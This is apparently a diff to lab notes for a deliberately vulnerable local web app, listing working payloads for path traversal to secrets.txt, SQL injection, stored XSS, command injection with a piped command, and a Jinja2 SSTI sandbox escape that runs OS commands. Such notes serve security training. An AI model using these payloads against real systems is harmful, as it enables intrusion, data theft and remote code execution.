@@ -3,21 +3,39 @@
 http://127.0.0.1:8080/find_secret?file=..\..\..\secrets.txt
 
 
-### SQLi
+### SQLi:
 
 enter "' OR 'a'='a';--" inside the Email Address field
 
-### XSS
+### XSS stored:
 
 After logging in as a user,
 Add a note such as "<script> alert(1) </script>"
 
 
 
-### Command injection
+### Command injection:
 
 
 go to http://127.0.0.1:8080/ping and
 
 enter "127.0.0.1 | whoami"
 
+
+### XSS Reflected:
+
+
+### SSTI:
+
+Vulnerable Endpoint: http://127.0.0.1:8080/find_secret?file=
+
+If you supply a file name that doesn't exist on the backend, it shows an error such as "404 page not found: the resource does not exist!".
+
+Since the template is being used insecurely, it's vulnerable to SSTI.
+
+Simply supply {{ 7 * 7 }} for the file parameter and observe it returns 49.
+
+We can also achieve a RCE with: (reveals the files in the current directory)
+```
+http://127.0.0.1:8080/find_secret?file={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20%22warning%22%20in%20x.__name__%20%}{{x()._module.__builtins__[%27__import__%27](%27os%27).popen(%22dir%22).read()}}{%endif%}{%%20endfor%20%}
+```
